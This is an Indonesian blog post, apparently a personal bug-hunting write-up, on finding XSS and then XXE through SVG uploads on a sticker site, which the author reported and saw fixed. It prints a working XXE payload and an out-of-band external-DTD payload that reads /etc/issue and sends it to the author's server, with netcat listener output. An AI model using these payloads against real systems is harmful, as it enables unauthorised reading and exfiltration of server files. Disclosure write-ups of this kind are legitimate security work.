@@ -1,0 +1,72 @@
+I"ç<p><img src="/images/xxe.jpg" alt="XXE" /></p>
+
+<p>Beberapa waktu lalu, saya sedang mencari situs untuk membuat custom sticker. Tidak lama saya menemunkan salah satu situs, dan di situs tersebut saya dapat membuat custom sticker dengan format gambar <strong>.svg</strong>. Lalu saya mencoba iseng meng-upload .svg file dengan payload XSS didalamnya.
+Setelah file .svg terupload, dan ternyata XSS ter-triger pada file tersebut.</p>
+
+<p><img src="/images/xxe_api_sa.jpg" alt="XSS Trigered" /></p>
+
+<p>Namun XSS tertriger pada domain api.[redacted].com, dan tidak ada cookie yang bisa diambil disitu, jadi saya pikir XSS ini pun tidak dapat meng-exploitasi user lain pada situs tersebut.</p>
+
+<p><img src="/images/sad.gif" alt="cat /etc/sad" /></p>
+
+<p>Mengingat file yang diupload adalah <strong>.svg</strong>, saya mencoba kemungkinan adanya kerentanan XXE pada situs tersebut. Untuk mengetesnya, saya menggunakan payload XXE sederhana seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE gpx [&lt;!ENTITY xxe SYSTEM "http://[redacted]:1337/ping_me" &gt;</span> ]&gt;
+<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"500px"</span> <span class="na">height=</span><span class="s">"40px"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">version=</span><span class="s">"1.1"</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
+</code></pre></div></div>
+
+<p>Dan benar saja, ada respond pada server saya!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@illuminate ~]# nc -lv 1337
+
+Connection from [redacted] port 1337 [tcp/menandmice-dns] accepted
+GET /ping_me HTTP/1.1
+Cache-Control: no-cache
+Pragma: no-cache
+User-Ageng: Java/1.8.0_111
+Host: [redacted]:1337
+Accept: text/html, image/gif, image/jpg, *;  q=.2, */*; q=.2
+Connection: keep-alive
+</code></pre></div></div>
+
+<p><img src="/images/kamen.gif" alt="kamen" /></p>
+
+<p>Untuk melakukan <em>file read</em> yang ada di server, saya memodifikasi sedikit payload menjadi seperti berikut:</p>
+
+<p>File <strong>.svg</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE xxe [ 
+ &lt;!ENTITY % file SYSTEM "file:///etc/issue"&gt;</span>
+ <span class="cp">&lt;!ENTITY % dtd SYSTEM "http://[redacted]/x.dtd"&gt;</span>
+%dtd;]&gt;<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"500px"</span> <span class="na">height=</span><span class="s">"40px"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">version=</span><span class="s">"1.1"</span><span class="nt">&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/svg&gt;</span>
+</code></pre></div></div>
+
+<p>File <strong>x.dtd</strong></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://[redacted]:1337/?%file;'&gt;</span>"&gt;
+%all;
+</code></pre></div></div>
+
+<p>Dan respond nya seperti berikut:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@illuminate ~]# nc -lv 1337
+
+Connection from [redacted] port 1337 [tcp/menandmice-dns] accepted
+GET /?Ubuntu 14.04.5 LTS \n \1 HTTP/1.1
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_111
+Host: [redacted]:1337
+Accept: text/html, image/gif, image/jpg, *;  q=.2, */*; q=.2
+Connection: keep-alive
+</code></pre></div></div>
+
+<p>Karena memang awalnya tidak berniat mencari Bug di website ini, dan website ini pun tidak menyediakan Program Bug Bounty jadi saya tidak mengharapkan imbalan atau reward atas temuan ini. Namun tidak ada salahnya bila kita melaporkan temuan ini supaya pemilik website memiliki kesempatan untuk memperbaiki celah tersebut.</p>
+
+<p><img src="/images/sticker_email.jpg" alt="reward" /></p>
+
+<p>Beberapa hari setelah saya mengirim report, pihak website menginformasikan bahwa celah tersebut telah diperbaiki, dan mereka meng-apresiasi dengan memberi reward berupa Phone Case (salah satu produk mereka).
+Hehe lumayan dapat Phone Case gratis dari luar negeri XD</p>
+
+:ET
